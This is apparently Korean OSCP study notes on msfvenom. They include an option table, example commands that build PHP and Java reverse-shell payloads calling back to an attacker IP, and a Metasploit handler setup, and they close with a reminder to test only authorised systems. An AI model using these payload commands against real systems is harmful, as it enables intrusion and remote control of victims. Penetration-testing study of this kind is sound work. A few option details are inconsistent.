# msfvenom

## 개요

`msfvenom`은 payload를 생성하는 도구이다. "어떤 언어/어떤 연결로 셸을 띄울지"를 정하는 것이 핵심이다.

## 기본 명령 구조

```bash
msfvenom [options] -p <payload> LHOST=<IP> LPORT=<PORT>
```

| 옵션 | 설명 |
|------|------|
| `-p` | 사용할 payload 모듈 |
| `-f` | 결과 파일 형식 (raw, php, js, ...) |
| `-e` | 추가로 사용할 encoding |
| `-o` | 결과 파일을 특정 경로에 저장 |
| `-list` | 사용 가능한 payload 목록 |

## payload 선택 예시

```bash
# PHP webshell (웹서버에 업로드)
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# PHP reverse_php (파일 업로드에 유리)
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php

# Java / Python 등
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

## handler 세팅 (공격자 측)

```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload php/reverse_php
msf6 > set LHOST 10.10.10.10
msf6 > set LPORT 4444
msf6 > exploit
```

## 주의

- payload마다 지원하는 연결 프로토콜이 다르다. `--list`으로 확인한다.
- 결과물을 타깃에 업로드할 때는 `file` 타입으로 저장한다.
- OSCP 시험에서는 독립 머신 1대에만 Metasploit을 사용할 수 있다.
- `exploit`를 실행하기 전에 `show options`로 현재 세팅을 확인한다.
- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
